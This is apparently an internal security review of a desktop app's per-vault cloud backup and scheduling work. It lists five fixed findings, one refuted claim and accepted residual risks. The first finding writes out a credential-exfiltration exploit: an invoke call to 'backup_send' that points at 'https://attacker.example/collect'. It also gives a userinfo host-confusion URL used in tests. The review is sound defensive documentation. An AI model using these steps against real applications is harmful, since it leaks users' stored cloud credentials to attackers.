# Security review: per-vault backups + desktop scheduling

> Adversarial review of the backup work on `feat/desktop-scheduled-backups` (issue #49 and the
> desktop scheduler). Four finder passes over the diff on independent lenses, then three skeptics
> per finding, each prompted to refute rather than confirm; a finding died on two refutations of
> three. Fifteen raw findings, fourteen unique, six verified, **five survived unanimously** (no
> skeptic could refute any of them). All five are fixed; this records what they were, what killed
> the one that did not survive, and what is deliberately still true.

## What survived, and what fixed it

| # | Severity | Finding | Fixed by |
|---|---|---|---|
| **1** | **CRITICAL** | `backup_send` was a confused deputy | origin pinning + main-window-only (`ddb0edb`) |
| **2** | HIGH | Two vaults sharing a folder cross-deleted each other's snapshots | vault-tagged object keys, scoped retention (`ddb0edb`) |
| **3** | HIGH | The no-credential-store fallback could never upload | inline-auth transport (`ddb0edb`) |
| **4** | MEDIUM | Deleting a vault orphaned its cloud credentials | erase before removing the list (`ddb0edb`) |
| **5** | LOW | No HTTP timeout, plus an in-flight latch | connect + overall timeouts (`ddb0edb`) |

### 1. `backup_send` was a confused deputy (CRITICAL)

`platform-desktop/src-tauri/src/backup.rs`. The design put credentials in the OS credential store
and refused to hand them back to the webview: `secure_store` rejects the `backup.creds:` prefix
through its generic commands. That guard was worth nothing on its own, because **the webview also
names the URL of every request**.

The exploit needs no keychain read at all:

1. Read the target ids from `storage_get_meta` on `backup.targets:<vaultId>`, which is plaintext
   device metadata and already exposed.
2. `invoke("backup_send", { vaultId, targetId, auth: { kind: "basic" }, method: "GET",
   url: "https://attacker.example/collect" })`.
3. Rust reads the secret from the keychain, attaches `Authorization: Basic <base64 user:password>`,
   and sends it to the attacker's server, which logs it.

Worse than first assumed: `capabilities/*.json` gate **plugin** permissions, not commands defined
by this crate, so the always-on-top spotlight panel could drive it too — the narrowest surface in
the app.

**Fixed** by storing `{ origin, secrets }` and refusing any request whose origin differs, with the
pin inside an item the webview can neither read nor rewrite. `backup_send` is also main-window
only. Tests cover an attacker host, a scheme change, a port change, a subdomain suffix, and
`https://cloud.example.com@attacker.example/` (userinfo, where the URL parser's host is the
attacker).

### 2. Cross-vault snapshot deletion (HIGH)

`core/src/backup/config.ts`. Found independently by two lenses. The whole point of the per-vault
change was that a target uses exactly the folder the user typed, with no derived `-<vaultId>`
suffix. But the folder field is optional and hidden behind "Advanced", so two vaults default to
the same prefix, and each vault's keep-N pass listed `<prefix>/` and pruned everything past N —
including the other vault's snapshots. With vault A monthly and vault B daily and keep=30, A's
only copy is evicted within a month, silently.

**Fixed** by tagging object keys with the vault (`-v<8 hex>` after the content hash, so the
timestamp remains the first varying component and lexical order stays chronological) and scoping
`selectForPruning` to that tag. Targets migrated off the device-global list stay untagged, because
their folder is already exclusive to one vault and their existing snapshots have no marker.

### 3. The no-credential-store fallback could never upload (HIGH)

`platform-desktop/src/backup.ts`. Where no credential store answers, credentials stay VEK-wrapped,
so `secrets !== null`, so the code passed **no transport** and fell back to a webview `fetch` —
which the same file documents as impossible, since no provider grants CORS to `tauri://localhost`.
Cloud backup was 100% broken in that configuration while `cloudBackup: desktop` shipped
unconditionally.

**Fixed** with an inline-auth path (`s3Inline` / `basicInline`): the caller passes the secret it
already unwrapped, and the request still leaves from Rust. The origin pin does not apply there,
deliberately — the caller had the credential before it called, so pinning restricts nothing that
is not already lost.

### 4 and 5

Deleting a vault removed `backup.targets:<id>`, which is the only thing naming the keychain items,
so plaintext credentials outlived the vault with no in-app path left to reach them. And the HTTP
client had no timeouts, so one provider that accepted a connection and then said nothing would
hang the run and hold the in-flight latch, stopping **every** vault's schedule until the app
restarted.

## What did not survive

**"Caller-supplied headers override the signer's own `host` and `x-amz-*`, making `backup_send` a
portable, replayable SigV4 signing oracle."** Refuted 2 of 3, on the code and on the exploit path.
Worth recording because it is the sort of claim that sounds decisive: the answer is that a
compromised renderer can already ask for requests to be sent, so minting a signature it could
have obtained anyway adds nothing, and the origin pin now bounds both.

## Found by re-reading, not by the review

The review did not raise these; they came out of working through its findings.

- **Pruning failed the backup.** A broken listing made `runBackup` throw *after* a successful
  upload, so `lastVaultHash` never advanced and the next tick re-uploaded the whole blob. Every
  five minutes, indefinitely, for a target whose prune is permanently broken.
- **The desktop had no `subscribeMeta`.** The tick stamps run state while a Settings panel holds a
  copy of the same list, and the panel's next write put the stale copy back.
- **"Back up now" folded outcomes into a pre-run copy**, resurrecting a target removed mid-flight
  after its credentials had been erased.
- **`secure_store` memoised reads for the process lifetime.** "The vault is locked" therefore never
  implied "no cloud credential is in memory", and had not since scheduled-while-locked shipped.
  Backup accounts now expire from that cache, and both the cached values and the deserialized
  secrets are `Zeroizing`. This one came from a question about the caveat rather than from the
  review, and the caveat was wrong: the exposure already existed.
- **The signer encoded the path twice** (`aba2ad7`), so any S3 prefix with a space had never
  worked. Pre-existing on main, and newly consequential because the Rust signer signs the wire
  form: the same target signed differently on the two platforms.

## Accepted, and why

- **A compromised renderer can still destroy backups.** Origin pinning stops exfiltration, not
  misuse: the webview can still drive deletes against the user's own bucket. Bounding that means
  moving orchestration into Rust, which forks object naming and retention into two
  implementations. Destruction by an attacker who already owns the renderer is the lesser evil.
- **Response bodies return to the webview**, so a compromised one can download the backups. They
  are ciphertext sealed by the master password, and it can already read the local vault file
  through `storage_read_vault`.
- **On Linux, any process running as the user can read the Secret Service** unprompted; there is
  no per-application ACL like the one macOS binds to a signed binary. What that tier buys is
  at-rest encryption while the session is locked, which full-disk encryption largely covers.
- **There is no opt-out** from unattended backups on a desktop with a working credential store.
  An opt-out is the same unanswerable question as an opt-in, asked the other way round; see
  [cloud-storage-backups.md](cloud-storage-backups.md).

## Method note

The five survivors were unanimous — zero of three skeptics could refute any of them — and the
three angles were deliberately different rather than three copies of one reader: one re-read the
code for a guard the finder missed, one tried to build the exploit end to end, one checked with
git whether the behaviour predated the branch or was a documented accepted trade. Six of fourteen
unique findings were verified, chosen by severity; the eight below that cut are unrefuted claims,
not confirmed findings, and several turned out to be real when read (the prune, the missing
`subscribeMeta`, the double-encoded path). A severity cap is a coverage decision, not a verdict.
